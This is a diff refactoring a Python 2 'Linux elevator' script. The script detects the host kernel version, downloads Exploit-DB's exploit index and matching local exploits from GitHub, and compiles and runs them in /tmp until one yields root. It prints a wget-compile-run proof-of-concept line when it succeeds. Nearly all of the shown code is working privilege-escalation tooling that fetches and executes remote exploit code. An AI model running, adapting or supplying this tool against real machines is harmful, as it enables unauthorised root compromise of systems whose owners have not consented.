@@ -9,21 +9,20 @@ import time
 
 import sys
 
-version = '0.1'
-db = "files.csv"
-keywords = ['linux', 'kernel', 'x86_64', '4.11']
+VERSION = '0.1'
+DB = "files.csv"
 
-end = False
+END = False
 
 
 def run(exploit, url_opener):
     filename = exploit['file'][exploit['file'].rindex('/') + 1:]
     try:
-        global end
+        global END
         exploit_url = "https://raw.githubusercontent.com/offensive-security/exploit-database/master/" + exploit['file']
         url_opener.retrieve(exploit_url, filename)
 
-        if end:
+        if END:
             return
         if filename.endswith('.c'):
             if len(exploit['description']) > 65:
@@ -41,7 +40,7 @@ def run(exploit, url_opener):
                 if 'uid=0(root) gid=0(root)' in read:
                     print '\nGot root!!\nID: [%s], PoC:\nwget %s --no-check-certificate; %s; %s;\n%s' % (
                         filename[:-2], exploit_url, compile_cmd, run_exploit, read)
-                    end = True
+                    END = True
                     sys.exit()
                 o.close()
     except Exception:
@@ -64,20 +63,24 @@ def find_keywords(uname_out):
     return {'os': tokens[0].lower(), 'version': (tokens[2][:tokens[2].index('.', 2)])}
 
 
-kernel = find_keywords(os.popen('uname -a', 'r').read())
-
-if __name__ == "__main__":
-    print '\n#### Linux elevator v%s ####\n' % version
+def run_escalator(ur_lopener=urllib.URLopener()):
+    print '\n#### Linux elevator v%s ####\n' % VERSION
     os.chdir('/tmp')
-    if not os.path.exists(db):
+    if not os.path.exists(DB):
         print 'missing DB file, downloading...'
-        urllib.URLopener().retrieve("https://raw.githubusercontent.com/offensive-security/exploit-database/master/files.csv", db)
+        ur_lopener.retrieve("https://raw.githubusercontent.com/offensive-security/exploit-database/master/files.csv", DB)
+    reader = csv.DictReader(open(DB, 'r').readlines(), ['id', 'file', 'description', 'date', 'author', 'platform', 'type', 'port'])
 
-    reader = csv.DictReader(open(db, 'r'), ['id', 'file', 'description', 'date', 'author', 'platform', 'type', 'port'])
+    kernel = find_keywords(os.popen('uname -a', 'r').read())
+
     print 'Finding exploits for %s kernel %s\n' % (kernel['os'], kernel['version'])
     for row in reader:
-        if end:
+        if END:
             os._exit(0)
         if (row['platform'].lower() == kernel['os'] or row['platform'].lower() == 'lin_x86') and row['type'] == 'local' and kernel['version'] in row['description'].lower():
-            threading.Thread(target=run, args=[row, urllib.URLopener()]).start()
+            threading.Thread(target=run, args=[row, ur_lopener]).start()
             time.sleep(0.8)
+
+
+if __name__ == "__main__":
+    run_escalator()
